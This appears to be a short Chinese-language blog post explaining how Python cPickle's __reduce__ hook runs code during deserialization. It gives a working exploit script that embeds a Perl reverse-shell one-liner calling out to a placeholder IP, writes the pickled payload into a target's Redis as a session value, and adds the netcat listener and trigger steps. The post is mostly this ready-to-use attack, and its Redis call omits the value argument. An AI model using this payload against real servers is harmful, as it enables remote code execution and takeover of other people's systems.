Title: Python cPickle 反序列化shell
Date: 2016-7-26
slug: python-cpickle-shell
Category: Python

利用Python cPickle反序列化反弹shell，主要利用cPicle的`__reduce__`，在反序列化的时候自动执行，官方文档有如下：

> When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:
> 
   A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.
   
 `__reduce__`的返回值，第一个作为`callable object`，第二个作为参数调用，所以可以有如下反弹shell的方法:
* <https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html>

```
#!/usr/bin/env python
import cPickle
import os
import redis

class exp(object):
    def __reduce__(self):
        s = """ perl -e 'use Socket;$i="xx.xx.xx.xx";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}'"""
        return (os.system, (s,))
   
e = exp()
s = cPickle.dumps(e)

r = redis.Redis(host='xxx.xxx.xxx.xxx', port=6379, db=0)
r.set('b026324c6904b2a9cb4b88d6d61c81d1')
```
执行之后，向目标IP写入key为b026324c6904b2a9cb4b88d6d61c81d1，其值是序列化的字符串，__reduce__函数可以反弹shell的session。
反弹shell指定端口 `nc -l -vv -p 443`
然后到redis页面设置session_id，刷新之后即可反弹。